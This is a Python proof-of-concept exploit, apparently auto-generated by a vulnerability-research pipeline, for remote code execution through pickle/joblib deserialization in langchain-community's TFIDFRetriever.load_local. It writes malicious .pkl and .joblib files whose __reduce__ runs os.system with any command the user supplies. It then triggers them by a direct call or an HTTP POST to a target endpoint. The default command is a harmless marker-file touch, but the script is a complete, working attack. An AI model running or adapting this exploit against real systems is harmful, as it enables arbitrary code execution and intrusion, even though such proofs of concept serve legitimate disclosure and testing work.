#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-019
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_30.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in TFIDFRetriever uses joblib.load and pickle.load
on files whose paths are constructed from user-controlled folder_path and file_name.
When allow_dangerous_deserialization is set to True (required for functionality),
an attacker who can control these parameters or place malicious files in the specified
folder can achieve remote code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious .joblib file that executes a benign command (touch /tmp/poc_success.txt)
2. Calling load_local with attacker-controlled folder_path and file_name pointing to the malicious file
3. Verifying the command was executed

Usage:
    python poc.py [--target TARGET_URL] [--folder FOLDER_PATH] [--filename FILENAME]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
from pathlib import Path

# Try to import requests, but we'll also support direct execution
try:
    import requests
except ImportError:
    requests = None


def create_malicious_joblib_payload(command: str) -> bytes:
    """
    Create a malicious joblib payload that executes a command when loaded.
    
    joblib.load uses pickle under the hood, so we can craft a pickle that
    executes arbitrary code during deserialization.
    
    Args:
        command: The command to execute
        
    Returns:
        Bytes of the malicious .joblib file
    """
    import pickle
    
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    # joblib files are just pickled objects with some compression
    # We'll create a simple pickle that executes our command
    payload = pickle.dumps(MaliciousPayload())
    return payload


def create_malicious_pickle_payload(command: str) -> bytes:
    """
    Create a malicious pickle payload that executes a command when loaded.
    
    Args:
        command: The command to execute
        
    Returns:
        Bytes of the malicious .pkl file
    """
    import pickle
    
    class MaliciousPayload:
        def __reduce__(self):
            return (os.system, (command,))
    
    payload = pickle.dumps(MaliciousPayload())
    return payload


def setup_malicious_files(folder_path: str, file_name: str, command: str) -> None:
    """
    Create malicious .joblib and .pkl files in the specified folder.
    
    Args:
        folder_path: Path to the folder where files will be created
        file_name: Base name for the files (without extension)
        command: Command to execute when files are loaded
    """
    path = Path(folder_path)
    path.mkdir(parents=True, exist_ok=True)
    
    # Create malicious .joblib file
    joblib_path = path / f"{file_name}.joblib"
    joblib_payload = create_malicious_joblib_payload(command)
    with open(joblib_path, "wb") as f:
        f.write(joblib_payload)
    print(f"[+] Created malicious .joblib file: {joblib_path}")
    
    # Create malicious .pkl file
    pkl_path = path / f"{file_name}.pkl"
    pkl_payload = create_malicious_pickle_payload(command)
    with open(pkl_path, "wb") as f:
        f.write(pkl_payload)
    print(f"[+] Created malicious .pkl file: {pkl_path}")


def exploit_via_direct_call(folder_path: str, file_name: str) -> bool:
    """
    Attempt to exploit the vulnerability by directly calling load_local.
    
    This simulates a scenario where the attacker can control folder_path and file_name
    and has placed malicious files in the specified folder.
    
    Args:
        folder_path: Path to the folder containing malicious files
        file_name: Base name of the malicious files
        
    Returns:
        True if exploitation was successful, False otherwise
    """
    try:
        # Import the vulnerable function
        from langchain_community.retrievers.tfidf import TFIDFRetriever
        
        print(f"[*] Calling load_local with folder_path='{folder_path}', file_name='{file_name}'")
        print(f"[*] allow_dangerous_deserialization=True")
        
        # This will trigger the vulnerability
        result = TFIDFRetriever.load_local(
            folder_path=folder_path,
            file_name=file_name,
            allow_dangerous_deserialization=True
        )
        
        print(f"[+] load_local returned: {result}")
        return True
        
    except Exception as e:
        print(f"[-] Error during exploitation: {e}")
        return False


def exploit_via_http(target_url: str, folder_path: str, file_name: str) -> bool:
    """
    Attempt to exploit the vulnerability via HTTP if a web endpoint is available.
    
    This simulates a scenario where the vulnerable function is exposed via a web API.
    
    Args:
        target_url: URL of the vulnerable endpoint
        folder_path: Path to the folder containing malicious files
        file_name: Base name of the malicious files
        
    Returns:
        True if exploitation was successful, False otherwise
    """
    if requests is None:
        print("[-] requests library not available, skipping HTTP exploitation")
        return False
    
    try:
        # Prepare the payload
        payload = {
            "folder_path": folder_path,
            "file_name": file_name,
            "allow_dangerous_deserialization": True
        }
        
        print(f"[*] Sending HTTP request to {target_url}")
        print(f"[*] Payload: {payload}")
        
        response = requests.post(
            target_url,
            json=payload,
            timeout=10
        )
        
        print(f"[+] HTTP response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
        
        return response.status_code == 200
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection error: Could not reach the target URL")
        return False
    except requests.exceptions.Timeout:
        print("[-] Timeout: Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error during HTTP exploitation: {e}")
        return False


def verify_exploitation() -> bool:
    """
    Verify that the exploitation was successful by checking for the marker file.
    
    Returns:
        True if the marker file exists, False otherwise
    """
    marker_file = "/tmp/poc_success.txt"
    
    # Wait a moment for the command to execute
    time.sleep(0.5)
    
    if os.path.exists(marker_file):
        print(f"[+] Exploitation successful! Marker file created: {marker_file}")
        # Clean up the marker file
        try:
            os.remove(marker_file)
        except:
            pass
        return True
    else:
        print("[-] Marker file not found. Exploitation may have failed.")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC exploit for langchain-community RCE vulnerability"
    )
    parser.add_argument(
        "--target",
        help="Target URL for HTTP exploitation (e.g., http://localhost:8000/api/v1/trigger)",
        default=None
    )
    parser.add_argument(
        "--folder",
        help="Folder path containing malicious files (default: temporary directory)",
        default=None
    )
    parser.add_argument(
        "--filename",
        help="Base filename for malicious files (default: malicious_payload)",
        default="malicious_payload"
    )
    parser.add_argument(
        "--command",
        help="Command to execute (default: touch /tmp/poc_success.txt)",
        default="touch /tmp/poc_success.txt"
    )
    parser.add_argument(
        "--http",
        action="store_true",
        help="Use HTTP exploitation instead of direct call"
    )
    
    args = parser.parse_args()
    
    # Use a temporary directory if no folder specified
    if args.folder is None:
        temp_dir = tempfile.mkdtemp(prefix="poc_langchain_")
        folder_path = temp_dir
    else:
        folder_path = args.folder
    
    print("[*] LangChain Community RCE PoC Exploit")
    print(f"[*] Using folder: {folder_path}")
    print(f"[*] Using filename: {args.filename}")
    print(f"[*] Command: {args.command}")
    print()
    
    # Step 1: Create malicious files
    print("[*] Step 1: Creating malicious files...")
    setup_malicious_files(folder_path, args.filename, args.command)
    print()
    
    # Step 2: Trigger the vulnerability
    print("[*] Step 2: Triggering the vulnerability...")
    
    if args.http and args.target:
        success = exploit_via_http(args.target, folder_path, args.filename)
    else:
        success = exploit_via_direct_call(folder_path, args.filename)
    
    print()
    
    # Step 3: Verify exploitation
    print("[*] Step 3: Verifying exploitation...")
    verified = verify_exploitation()
    
    print()
    if verified:
        print("[+] PoC completed successfully!")
        print("[+] The vulnerability is confirmed exploitable.")
        print("[+] The command was executed on the target system.")
    else:
        print("[-] PoC failed to verify exploitation.")
        print("[*] This may be due to:")
        print("[*]   - The vulnerable function not being available")
        print("[*]   - The command not executing as expected")
        print("[*]   - The marker file being cleaned up")
        print("[*] Check the error messages above for details.")
    
    # Clean up temporary directory if we created one
    if args.folder is None:
        import shutil
        shutil.rmtree(folder_path, ignore_errors=True)
        print(f"[*] Cleaned up temporary directory: {folder_path}")


if __name__ == "__main__":
    main()
